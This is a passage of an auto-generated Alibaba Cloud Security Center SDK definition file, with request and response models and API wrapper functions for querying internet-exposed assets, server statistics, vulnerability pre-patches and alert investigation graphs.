>  For more information about the mapping between region IDs and region names, see [Regions and zones](https://help.aliyun.com/document_detail/40654.html).', example='cn-hangzhou'),
      totalVulCount?: int32(name='TotalVulCount', description='The total number of vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='0'),
      uuid?: string(name='Uuid', description='The UUID of the server or the instance ID of the cloud service.', example='dd803d9e-a337-4add-9c5b-7d503e08****'),
    }
  ](name='ExposedInstances', description='The details of the exposures.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='598A4A61-ABA7-456B-8725-7378258276D9'),
}

model DescribeExposedInstanceListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeExposedInstanceListResponseBody(name='body'),
}

/**
 * @summary Queries the information about the assets that are exposed on the Internet.
 *
 * @param request DescribeExposedInstanceListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeExposedInstanceListResponse
 */
async function describeExposedInstanceListWithOptions(request: DescribeExposedInstanceListRequest, runtime: Util.RuntimeOptions): DescribeExposedInstanceListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  if (!Util.isUnset(request.cspmStatus)) {
    query['CspmStatus'] = request.cspmStatus;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.exposureComponent)) {
    query['ExposureComponent'] = request.exposureComponent;
  }
  if (!Util.isUnset(request.exposureIp)) {
    query['ExposureIp'] = request.exposureIp;
  }
  if (!Util.isUnset(request.exposurePort)) {
    query['ExposurePort'] = request.exposurePort;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.healthStatus)) {
    query['HealthStatus'] = request.healthStatus;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.instanceName)) {
    query['InstanceName'] = request.instanceName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.vulStatus)) {
    query['VulStatus'] = request.vulStatus;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedInstanceList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about the assets that are exposed on the Internet.
 *
 * @param request DescribeExposedInstanceListRequest
 * @return DescribeExposedInstanceListResponse
 */
async function describeExposedInstanceList(request: DescribeExposedInstanceListRequest): DescribeExposedInstanceListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedInstanceListWithOptions(request, runtime);
}

model DescribeExposedStatisticsResponseBody = {
  exposedAsapVulCount?: int32(name='ExposedAsapVulCount', description='The total number of high-risk vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='1'),
  exposedComponentCount?: int32(name='ExposedComponentCount', description='The total number of system components that are exposed on the Internet. The components include OpenSSL and OpenSSH.', example='7'),
  exposedDdsCount?: int32(name='ExposedDdsCount', description='The number of ApsaraDB for MongoDB instances that are exposed on the Internet.', example='1'),
  exposedEcsCount?: int32(name='ExposedEcsCount', description='The number of Elastic Compute Service (ECS) instances that are exposed on the Internet.', example='5'),
  exposedInstanceCount?: int32(name='ExposedInstanceCount', description='The total number of assets that are exposed on the Internet.', example='100'),
  exposedIpCount?: int32(name='ExposedIpCount', description='The total number of IP addresses that are exposed on the Internet.', example='100'),
  exposedKvstoreCount?: int32(name='ExposedKvstoreCount', description='The number of ApsaraDB for Redis instances that are exposed on the Internet.', example='3'),
  exposedLaterVulCount?: int32(name='ExposedLaterVulCount', description='The total number of medium-risk vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='5'),
  exposedNntfVulCount?: int32(name='ExposedNntfVulCount', description='The total number of low-risk vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='0'),
  exposedPortCount?: int32(name='ExposedPortCount', description='The total number of ports that are exposed on the Internet.', example='6'),
  exposedRdsCount?: int32(name='ExposedRdsCount', description='The number of ApsaraDB RDS instances that are exposed on the Internet.', example='1'),
  exposedWeekPasswordMachineCount?: int32(name='ExposedWeekPasswordMachineCount', description='The total number of system keys that are detected on your servers and are exposed on the Internet.', example='20'),
  gatewayAssetCount?: int32(name='GatewayAssetCount', description='The total number of gateway assets that are exposed on the Internet. The gateway assets include NAT gateways and Server Load Balancer (SLB) instances.', example='3'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4B897D10-B3CD-4A93-A5FA-591F3ED12A86'),
}

model DescribeExposedStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeExposedStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the exposure statistics of the assets on the Internet.
 *
 * @param request DescribeExposedStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeExposedStatisticsResponse
 */
async function describeExposedStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeExposedStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeExposedStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the exposure statistics of the assets on the Internet.
 *
 * @return DescribeExposedStatisticsResponse
 */
async function describeExposedStatistics(): DescribeExposedStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedStatisticsWithOptions(runtime);
}

model DescribeExposedStatisticsDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the ID.', example='127608589417****'),
  statisticsType?: string(name='StatisticsType', description='The type of the exposed asset. Valid values:

*   **exposureType**: gateway assets
*   **exposurePort**: ports
*   **exposureComponent**: system components
*   **exposureIp**: IP addresses

This parameter is required.', example='exposureType'),
  statisticsTypeGatewayType?: string(name='StatisticsTypeGatewayType', description='The type of the gateway asset. This parameter is required when the **StatisticsType** parameter is set to **exposureType**. Valid values:

*   **SLB**: the public IP address of a Server Load Balancer (SLB) instance
*   **DNAT**: the NAT gateway that connects to the Internet by using the DNAT feature', example='SLB'),
  statisticsTypeInstanceValue?: string(name='StatisticsTypeInstanceValue', description='The ID of the gateway asset. This parameter is required when the **StatisticsType** parameter is set to **exposureType**.', example='lb-2ze4rso39h4nczcqs****'),
}

model DescribeExposedStatisticsDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7CBAFB3F-1ED7-4A23-986A-6F67F0466BD1'),
  statisticsDetails?: [ 
    {
      exposedCount?: int32(name='ExposedCount', description='The total number of system vulnerabilities that are detected on your server and are exposed on the Internet.', example='0'),
      exposureComponent?: string(name='ExposureComponent', description='The system component that is exposed on the Internet.', example='tomcat'),
      exposureIp?: string(name='ExposureIp', description='The public IP address that is exposed on the Internet.', example='123.57.XX.XX'),
      exposurePort?: string(name='ExposurePort', description='The port that is exposed on the Internet.', example='22'),
      exposureType?: string(name='ExposureType', description='The resource from which the asset is exposed. Valid values:

*   **INTERNET_IP**: the IP address of the Elastic Compute Service (ECS) instance
*   **SLB**: the public IP address of the SLB instance
*   **EIP**: the elastic IP address (EIP)
*   **DNAT**: the NAT gateway that connects to the Internet by using the DNAT feature', example='SLB'),
      exposureTypeId?: string(name='ExposureTypeId', description='The ID of the instance to which the resource belongs. The valid values of this parameter vary based on the value of the ExposureType parameter.

*   If the value of the **ExposureType** parameter is **INTERNET_IP**, the value of this parameter is an empty string.
*   If the value of the **ExposureType** parameter is **SLB**, the value of this parameter is the ID of the Internet-facing SLB instance.
*   If the value of the **ExposureType** parameter is **EIP**, the value of this parameter is the ID of the EIP.
*   If the value of the **ExposureType** parameter is **DNAT**, the value of this parameter is the ID of the NAT gateway.', example='lb-2ze4rso39h4nczcqs****'),
      exposureTypeInstanceName?: string(name='ExposureTypeInstanceName', description='The name of the gateway asset that is exposed on the Internet.', example='ngw-bp1vkbju8f3w87c9v****'),
      regionId?: string(name='RegionId', description='The region ID of the asset.', example='cn-hangzhou'),
    }
  ](name='StatisticsDetails', description='An array consisting of the gateway assets, ports, system components, or public IP addresses that are exposed on the Internet and are returned.'),
}

model DescribeExposedStatisticsDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeExposedStatisticsDetailResponseBody(name='body'),
}

/**
 * @summary Queries the gateway assets, ports, system components, or public IP addresses that are exposed on the Internet.
 *
 * @param request DescribeExposedStatisticsDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeExposedStatisticsDetailResponse
 */
async function describeExposedStatisticsDetailWithOptions(request: DescribeExposedStatisticsDetailRequest, runtime: Util.RuntimeOptions): DescribeExposedStatisticsDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.statisticsType)) {
    query['StatisticsType'] = request.statisticsType;
  }
  if (!Util.isUnset(request.statisticsTypeGatewayType)) {
    query['StatisticsTypeGatewayType'] = request.statisticsTypeGatewayType;
  }
  if (!Util.isUnset(request.statisticsTypeInstanceValue)) {
    query['StatisticsTypeInstanceValue'] = request.statisticsTypeInstanceValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedStatisticsDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the gateway assets, ports, system components, or public IP addresses that are exposed on the Internet.
 *
 * @param request DescribeExposedStatisticsDetailRequest
 * @return DescribeExposedStatisticsDetailResponse
 */
async function describeExposedStatisticsDetail(request: DescribeExposedStatisticsDetailRequest): DescribeExposedStatisticsDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedStatisticsDetailWithOptions(request, runtime);
}

model DescribeFieldStatisticsRequest {
  machineTypes?: string(name='MachineTypes', description='The type of the asset to query. If no asset types are specified, all types of assets are returned. Valid values:

*   **ecs**: server
*   **cloud_product**: Alibaba Cloud service', example='ecs'),
  regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.', example='cn-hangzhou'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The ID of the primary account of the Resource Directory member account.
> call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) interface to obtain this parameter.', example='1232428423234****'),
}

model DescribeFieldStatisticsResponseBody = {
  groupedFields?: {
    aliYunInstanceCount?: int32(name='AliYunInstanceCount', description='The number of assets that are deployed on Alibaba Cloud.', example='100'),
    awsInstanceCount?: int32(name='AwsInstanceCount', description='The number of servers.', example='100'),
    azureInstanceCount?: int32(name='AzureInstanceCount', description='The number of third-party cloud servers.', example='5'),
    exposedInstanceCoreCount?: long(name='ExposedInstanceCoreCount', description='The number of cores of exposed assets.', example='30'),
    exposedInstanceCount?: int32(name='ExposedInstanceCount', description='The number of exposed servers.', example='1'),
    generalAssetCount?: int32(name='GeneralAssetCount', description='The number of assets whose importance is common.', example='10'),
    groupCount?: int32(name='GroupCount', description='The number of server groups.', example='20'),
    huaweiInstanceCount?: int32(name='HuaweiInstanceCount', description='The number of instances that are provisioned by third-party providers.', example='0'),
    idcInstanceCount?: int32(name='IdcInstanceCount', description='The number of assets that can be protected by Security Center.', example='100'),
    importantAssetCount?: int32(name='ImportantAssetCount', description='The number of assets whose importance is important.', example='10'),
    instanceCoreCount?: long(name='InstanceCoreCount', description='The number of cores of assets in the specified asset type. If the asset type is not specified, the value of this parameter indicates the total number of cores of servers and Alibaba Cloud services within your account.', example='301'),
    instanceCount?: int32(name='InstanceCount', description='The total number of assets of the specified type. If no asset types are specified, this parameter indicates the total number of all servers and Alibaba Cloud services within your account.', example='100'),
    instanceSyncTaskCount?: int32(name='InstanceSyncTaskCount', description='The total number of tasks for the specified type of assets. If no asset types are specified, this parameter indicates the total number of all servers and Alibaba Cloud services within your account.', example='10'),
    newInstanceCoreCount?: long(name='NewInstanceCoreCount', description='The number of cores of new servers.', example='30'),
    newInstanceCount?: int32(name='NewInstanceCount', description='The number of newly added servers.', example='10'),
    noRiskInstanceCount?: int32(name='NoRiskInstanceCount', description='The number of servers on which no risks are detected.', example='10'),
    notBindMachineInstanceCount?: int32(name='NotBindMachineInstanceCount', description='The number of assets that are not added to Security Center of the specified asset type.', example='10'),
    notRunningStatusCoreCount?: long(name='NotRunningStatusCoreCount', description='The number of cores of servers that are not started.', example='30'),
    notRunningStatusCount?: int32(name='NotRunningStatusCount', description='The number of servers that are shut down.', example='10'),
    offlineInstanceCount?: int32(name='OfflineInstanceCount', description='The number of servers whose Security Center agent status is Offline.', example='21'),
    outMachineInstanceCount?: int32(name='OutMachineInstanceCount', description='The number of servers outside the cloud.', example='20'),
    pauseInstanceCount?: int32(name='PauseInstanceCount', description='The number of servers for which the Security Center agent suspends protection.', example='10'),
    regionCount?: int32(name='RegionCount', description='The number of regions to which the servers belong.', example='11'),
    riskInstanceCoreCount?: long(name='RiskInstanceCoreCount', description='The number of cores of vulnerable assets.', example='201'),
    riskInstanceCount?: int32(name='RiskInstanceCount', description='The number of assets that are at risk.', example='90'),
    tencentInstanceCount?: int32(name='TencentInstanceCount', description='The total number of cloud services that are protected by Security Center.', example='10'),
    testAssetCount?: int32(name='TestAssetCount', description='The number of assets whose importance is test.', example='10'),
    tripartiteInstanceCount?: int32(name='TripartiteInstanceCount', description='The number of simple application servers.', example='2'),
    unKnowStatusInstanceCount?: int32(name='UnKnowStatusInstanceCount', description='The number of servers that are in the Unknown state.', example='1'),
    unprotectedInstanceCoreCount?: long(name='UnprotectedInstanceCoreCount', description='The number of cores of unprotected assets.', example='30'),
    unprotectedInstanceCount?: int32(name='UnprotectedInstanceCount', description='The number of unprotected assets.', example='10'),
    vpcCount?: int32(name='VpcCount', description='The number of virtual private clouds (VPCs).', example='5'),
  }(name='GroupedFields', description='The information about servers that are returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeFieldStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeFieldStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics of servers.
 *
 * @param request DescribeFieldStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeFieldStatisticsResponse
 */
async function describeFieldStatisticsWithOptions(request: DescribeFieldStatisticsRequest, runtime: Util.RuntimeOptions): DescribeFieldStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeFieldStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics of servers.
 *
 * @param request DescribeFieldStatisticsRequest
 * @return DescribeFieldStatisticsResponse
 */
async function describeFieldStatistics(request: DescribeFieldStatisticsRequest): DescribeFieldStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeFieldStatisticsWithOptions(request, runtime);
}

model DescribeFixUsedCountResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='CB1CE824-7F80-546D-8AF8-4A5209F9B698'),
  usedCount?: int32(name='UsedCount', description='The number of vulnerabilities that are fixed by the vulnerability fixing feature.', example='10'),
  usedCountCn?: int32(name='UsedCountCn', description='The number of vulnerabilities that are fixed by the vulnerability fixing feature in China.', example='5'),
  usedCountSg?: int32(name='UsedCountSg', description='The number of vulnerabilities that are fixed by the vulnerability fixing feature outside China.', example='5'),
}

model DescribeFixUsedCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeFixUsedCountResponseBody(name='body'),
}

/**
 * @summary Queries the number of vulnerabilities that are fixed by the pay-as-you-go vulnerability fixing feature.
 *
 * @param request DescribeFixUsedCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeFixUsedCountResponse
 */
async function describeFixUsedCountWithOptions(runtime: Util.RuntimeOptions): DescribeFixUsedCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeFixUsedCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of vulnerabilities that are fixed by the pay-as-you-go vulnerability fixing feature.
 *
 * @return DescribeFixUsedCountResponse
 */
async function describeFixUsedCount(): DescribeFixUsedCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeFixUsedCountWithOptions(runtime);
}

model DescribeFrontVulPatchListRequest {
  info?: string(name='Info', description='The information about the Windows system vulnerability. The value is a JSON string that contains the following fields:

*   **name**: the name of the vulnerability.
*   **uuid**: the UUID of the server on which the vulnerability is detected.
*   **tag**: the tag that is added to the vulnerability. Set this field to **system**, which indicates Windows system vulnerabilities.

This parameter is required.', example='[{"name":"5000803","uuid":"026c9296-1234-5678-b937-a7d81f05****","tag":"system"}]'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  operateType?: string(name='OperateType', description='The operation that you want to perform on the vulnerability. Set the value to **vul_fix**, which indicates vulnerability fixing.

This parameter is required.', example='vul_fix'),
  type?: string(name='Type', description='The type of the vulnerability. Set the value to **sys**, which indicates Windows system vulnerabilities.

This parameter is required.', example='sys'),
}

model DescribeFrontVulPatchListResponseBody = {
  frontPatchList?: [ 
    {
      patchList?: [ 
        {
          aliasName?: string(name='AliasName', description='The name of the vulnerability.', example='RHBA-2019:2599: krb5 bug fix update'),
          name?: string(name='Name', description='The version number of the pre-patch that is required to fix the Windows system vulnerability.', example='4523204'),
        }
      ](name='PatchList', description='An array consisting of the pre-patches that are required to fix the specified Windows system vulnerability on the server.'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='1587bedb-fdb4-48c4-9330-4545****'),
    }
  ](name='FrontPatchList', description='An array consisting of the information about the pre-patches that are required to fix the specified Windows system vulnerability.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F929E952-EBFC-56C3-BD35-BF8B59024C68'),
}

model DescribeFrontVulPatchListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeFrontVulPatchListResponseBody(name='body'),
}

/**
 * @summary Queries the pre-patches that are required to fix a specified Windows system vulnerability.
 *
 * @param request DescribeFrontVulPatchListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeFrontVulPatchListResponse
 */
async function describeFrontVulPatchListWithOptions(request: DescribeFrontVulPatchListRequest, runtime: Util.RuntimeOptions): DescribeFrontVulPatchListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.info)) {
    query['Info'] = request.info;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeFrontVulPatchList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the pre-patches that are required to fix a specified Windows system vulnerability.
 *
 * @param request DescribeFrontVulPatchListRequest
 * @return DescribeFrontVulPatchListResponse
 */
async function describeFrontVulPatchList(request: DescribeFrontVulPatchListRequest): DescribeFrontVulPatchListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeFrontVulPatchListWithOptions(request, runtime);
}

model DescribeGraph4InvestigationOnlineRequest {
  anomalyId?: string(name='AnomalyId', description='The ID of the alert event. You can call [DescribeSuspEvents](~~DescribeSuspEvents~~) to obtain the alert event ID, with the value path being: data.SuspEvents[index].UniqueInfo.', example='786fc80896b25422b5324cb6e57bxxxx'),
  anomalyUuid?: string(name='AnomalyUuid', description='The UUID of the alert event asset. You can call [DescribeSuspEvents](~~DescribeSuspEvents~~) to obtain the asset UUID, with the value path being: data.SuspEvents[index].Uuid.', example='3502e4b0-f362-4059-84a2-f47fa2b5exxx'),
  lang?: string(name='Lang', description='Sets the language type for the request and response messages. The default is **zh**. Values:

- **zh**: Chinese
- **en**: English', example='zh'),
  namespace?: string(name='Namespace', description='The namespace of the graph, which is fixed as: hundun_dc_online.

This parameter is required.', example='hundun_dc_online'),
  vertexId?: string(name='VertexId', description='Vertex ID. This does not need to be proactively provided.', example='29872354f741b1b044b8a9b4e2ab****'),
}

model DescribeGraph4InvestigationOnlineResponseBody = {
  code?: string(name='Code', description='Result code, where **200** indicates success. Any other value indicates failure, and the caller can use this field to determine the reason for the failure.', example='200'),
  data?: {
    edgeList?: [ 
      {
        endId?: string(name='EndId', description='ID of the end point of the edge.', example='f944c2362c7e111dee16f0e70ad2xxxx'),
        endType?: string(name='EndType', description='The type of the end point of the current edge. Possible values include but are not limited to:
- **process**: Process
- **file**: File
- **alert**: Alert
- **ip**: IP address
- **domain**: Domain', example='process'),
        name?: string(name='Name', description='Edge name.', example='bash->apt-get'),
        startId?: string(name='StartId', description='Start vertex id of edge.', example='f944c2362c7e111dee16f0e70ad2xxxx'),
        startType?: string(name='StartType', description='The type of the starting point of the edge. Possible values include, but are not limited to:
- **process**： Process
- **file**： File
- **alert**： Alert
- **ip**： IP address
- **domain**： Domain', example='file'),
        time?: string(name='Time', description='The time when the edge was established.', example='2024-07-01 15:25:46'),
        type?: string(name='Type', description='The type of the edge.', example='process_spawn_process'),
      }
    ](name='EdgeList', description='List of edges.'),
    entityTypeList?: [ 
      {
        displayColor?: string(name='DisplayColor', description='Vertex rendering color.', example='#fff'),
        displayIcon?: string(name='DisplayIcon', description='Vertex icon.', example='https://img.alicdn.com/tfs/TB176P5OgDqK1RjSZSyXXaxEVXa-49-48.png'),
        displayOrder?: int32(name='DisplayOrder', description='Display order', example='1'),
        id?: string(name='Id', description='Node type ID.', example='1'),
        name?: string(name='Name', description='Vertex name.', example='alert'),
      }
    ](name='EntityTypeList', description='List of vertex types.'),
    relationTypeList?: [ 
      {
        directed?: int32(name='Directed', description='Direction of the edge. Possible values:
- **1** ： Forward
- **0**： Reverse', example='1'),
        displayColor?: string(name='DisplayColor', description='Render color of the edge.', example='#fff'),
        displayIcon?: string(name='DisplayIcon', description='Icon style of the edge', example='https://img.alicdn.com/imgextra/i4/O1CN01ft6rvQ22uUX2JsTmv_!!6000000007180-55-tps-12-12.svg'),
        name?: string(name='Name', description='Name of the edge.', example='spawn process'),
      }
    ](name='RelationTypeList', description='List of edge types.'),
    vertexList?: [ 
      {
        name?: string(name='Name', description='Vertex name.', example='1a79b3a10ad5e6cad090dd697a7axxxxx'),
        neighborList?: [ 
          {
            count?: int32(name='Count', description='Number of neighboring nodes.', example='1'),
            hasMore?: boolean(name='HasMore', description='Indicates whether there are more neighboring vertices.', example='False'),
            type?: string(name='Type', description='Neighbor node type.', example='alert'),
          }
        ](name='NeighborList', description='List of neighboring vertices of the current vertex.'),
        properties?: string(name='Properties', description='Properties.', example='{\\\\"DomainName\\\\": {\\\\"SupportScratchDetection\\\\": False, \\\\"Description\\\\": \\\\"The name of the domain.\\\\", \\\\"Required\\\\": True, \\\\"UpdateAllowed\\\\": False, \\\\"Type\\\\": \\\\"string\\\\", \\\\"Immutable\\\\": False}}'),
        time?: string(name='Time', description='Time.', example='2024-07-02 16:14:01'),
        type?: string(name='Type', description='Vertex type.', example='alert'),
        uuid?: string(name='Uuid', description='Asset UUID.', example='5c081b02-f66a-47a4-bd2f-79ee3eafxxxx'),
      }
    ](name='VertexList', description='List of vertices.'),
  }(name='Data', description='Data'),
  message?: string(name='Message', description='The response message from the request.', example='successful'),
  requestId?: string(name='RequestId', description='A unique identifier generated by Alibaba Cloud for this request.', example='C699E4E4-F2F4-58FC-A949-457FFE59****'),
  success?: boolean(name='Success', description='The result status of the API call. Values:
- **true**: The API call was successful.
- **false**: The API call failed.', example='true'),
}

model DescribeGraph4InvestigationOnlineResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeGraph4InvestigationOnlineResponseBody(name='body'),
}

/**
 * @summary Alert Event Investigation
 *
 * @param request DescribeGraph4InvestigationOnlineRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeGraph4InvestigationOnlineResponse
 */
async function describeGraph4InvestigationOnlineWithOptions(request: DescribeGraph4InvestigationOnlineRequest, runtime: Util.RuntimeOptions): DescribeGraph4InvestigationOnlineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.anomalyId)) {
    query['AnomalyId'] = request.anomalyId;
  }
  if (!Util.isUnset(request.anomalyUuid)) {
    query['AnomalyUuid'] = request.anomalyUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.vertexId)) {
    query['VertexId'] = request.vertexId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGraph4InvestigationOnline',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Alert Event Investigation
 *
 * @param request DescribeGraph4InvestigationOnlineRequest
 * @return DescribeGraph4InvestigationOnlineResponse
 */
async function describeGraph4InvestigationOnline(request: DescribeGraph4InvestigationOnlineRequest): DescribeGraph4InvestigationOnlineResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGraph4InvestigationOnlineWithOptions(request, runtime);
}

model DescribeGroupStructRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DescribeGroupStructResponseBody = {
